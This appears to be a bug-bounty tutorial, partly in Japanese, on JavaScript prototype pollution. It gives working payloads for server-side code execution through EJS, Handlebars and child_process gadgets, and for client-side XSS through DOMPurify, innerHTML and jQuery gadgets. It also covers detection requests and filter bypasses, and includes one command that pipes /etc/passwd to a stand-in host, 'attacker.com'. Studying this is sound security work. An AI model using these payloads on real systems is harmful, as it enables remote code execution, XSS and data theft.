Prototype Pollution (Advanced)

JavaScriptのprototypeチェーンを操作し、Server-side RCEまたはClient-side XSSを達成。 Node.jsアプリケーションおよびフロントエンドフレームワークの両方で深刻な影響を持つ。

Theory Hands-on Case Study

Mechanism

JavaScript Prototype Chain

// Every JS object has a prototype chain
const obj = {};
obj.__proto__ === Object.prototype  // true

// Properties are looked up through the chain:
// obj.property → obj.__proto__.property → Object.prototype.property

// POLLUTION: modifying Object.prototype affects ALL objects
obj.__proto__.isAdmin = true;
const newObj = {};
newObj.isAdmin  // true! (inherited from polluted prototype)

Pollution Vectors

// Direct __proto__ assignment
userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge(target, userInput);
// target.__proto__.isAdmin = true → ALL objects now have isAdmin=true

// constructor.prototype (alternative path)
userInput = {"constructor": {"prototype": {"isAdmin": true}}};
merge(target, userInput);

// Nested path notation
obj["__proto__"]["polluted"] = "yes";
obj["constructor"]["prototype"]["polluted"] = "yes";

Vulnerable merge/clone Functions

// Vulnerable deep merge (common in lodash < 4.17.19, etc.)
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);  // Recursion follows __proto__
    } else {
      target[key] = source[key];
    }
  }
}

// Attack:
merge({}, JSON.parse('{"__proto__": {"polluted": true}}'));
// Now: ({}).polluted === true  for ALL new objects!

Server-Side Exploitation (Node.js)

Gadget 1: RCE via child_process

// If application uses child_process.execSync/spawn somewhere:
// Pollute environment variables or shell options

// Target code (somewhere in the app):
const { execSync } = require('child_process');
execSync('ls', options);  // options inherits from prototype

// Pollution:
Object.prototype.shell = '/proc/self/exe';
Object.prototype.env = { NODE_OPTIONS: '--require=/tmp/evil.js' };
Object.prototype.argv0 = 'node';

// Or more direct:
Object.prototype.shell = true;
Object.prototype.input = 'cat /etc/passwd | curl attacker.com -d @-';

Gadget 2: Template Injection (EJS/Pug/Handlebars)

// EJS gadget (most common in BB)
// If app uses res.render() with EJS:

// Pollution payload:
{"__proto__": {
  "outputFunctionName": "x;global.process.mainModule.require('child_process').execSync('id');s"
}}

// EJS template compilation includes:
// var __output = [], __append = __output.push.bind(__output);
// becomes:
// var x;global.process.mainModule.require('child_process').execSync('id');s = ...
// → RCE!

Gadget 3: Handlebars RCE

// Handlebars compileOptions pollution
{"__proto__": {
  "allowProtoMethodsByDefault": true,
  "allowProtoPropertiesByDefault": true
}}
// Enables access to constructor → RCE via template:
// {{#with "s" as |string|}}
//   {{#with (string.sub.apply 0 (string.sub.call (string.sub.constructor "return this.process.mainModule.require('child_process').execSync('id')")))}}

Gadget 4: Express/Koa Status Code

// Pollute status or statusCode
Object.prototype.status = 500;
// All responses without explicit status → 500 Internal Server Error
// DoS impact (availability)

Client-Side Exploitation (DOM XSS)

HTML Sanitizer Bypass

// DOMPurify gadgets (older versions)
// Pollute allowed tags/attributes
Object.prototype.ALLOWED_TAGS = ['img', 'script'];
Object.prototype.ALLOWED_ATTR = ['onerror', 'src'];

// Or bypass via:
Object.prototype.document = { nodeType: 9 };  // Confuse DOMPurify's document detection

DOM Gadgets

// innerHTML gadgets
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
// If code does: element.innerHTML = obj.content || defaults.content
// And defaults inherits from prototype → XSS

// srcdoc gadgets (iframe)
Object.prototype.srcdoc = '<script>alert(document.domain)</script>';

// jQuery gadgets
Object.prototype.url = 'javascript:alert(1)';
Object.prototype.href = 'javascript:alert(1)';
// jQuery .attr() or .prop() may use polluted values

URL Pollution for XSS

// If code constructs URLs from config objects:
Object.prototype.protocol = 'javascript:';
Object.prototype.hostname = 'alert(1)//';
// URL(obj) → "javascript:alert(1)//..."

DOM Clobbering Relationship

DOM Clobberingは Prototype Pollution と似たeffectをHTMLレベルで達成する。 name属性やHTML ID属性でwindowオブジェクトの プロパティを上書きする。 

<!-- DOM Clobbering: overwrite window.CONFIG -->
<a id="CONFIG" href="javascript:alert(1)"></a>

<script>
  // Developer expects CONFIG to be undefined or their object
  if (window.CONFIG) {
    location = CONFIG.href;  // → javascript:alert(1)
  }
</script>

<!-- Nested clobbering for deeper properties -->
<form id="CONFIG"><input name="url" value="javascript:alert(1)"></form>
<script>
  fetch(CONFIG.url);  // CONFIG.url = the input element's value
</script>

Detection & Testing

Server-Side Detection

# Send pollution payload in JSON body/query parameters
POST /api/settings HTTP/1.1
Content-Type: application/json

{"__proto__": {"polluted": "yes"}}

# Then check if pollution persists:
GET /api/anything HTTP/1.1
# If response includes "polluted" key or behavior changes → vulnerable

# Or use constructor path:
{"constructor": {"prototype": {"polluted": "yes"}}}

Client-Side Detection

// Check via URL parameters (common client-side vector)
https://target.com/page?__proto__[polluted]=yes
https://target.com/page?constructor.prototype.polluted=yes

// Verify in browser console:
({}).polluted  // "yes" → pollution successful!

// Then find gadgets that use the polluted property

Gadget Discovery Process

  1. Confirm pollution: 任意のプロパティをObject.prototypeに設定可能か確認
  2. Identify sinks: コード内でpropertyがどこで使われるか調査
  3. Match known gadgets: 使用しているライブラリに既知のgadgetがないか確認
  4. Craft payload: gadgetに合わせたpollutionプロパティ名と値を設定

Defense Bypass Techniques

  • Object.freeze(Object.prototype) → __proto__ 経路には有効。実際の bypass は他の prototype chain (例: Array.prototype, Function.prototype) を標的にする
  • Key blacklist (__proto__) → bypass: constructor.prototype, unicode encoding
  • Object.create(null) → this IS effective (no prototype chain)
  • Map instead of Object → this IS effective
BB Tips

多くのNode.jsアプリは Object.create(null) を全面適用していない。 設定オブジェクトやユーザーinput処理のどこか1箇所でも 通常のobject mergeを使っていれば攻撃可能。 package.json の依存関係からlodash/jQuery等のバージョンを特定し、 既知のpollution sourceを探すのが効率的。
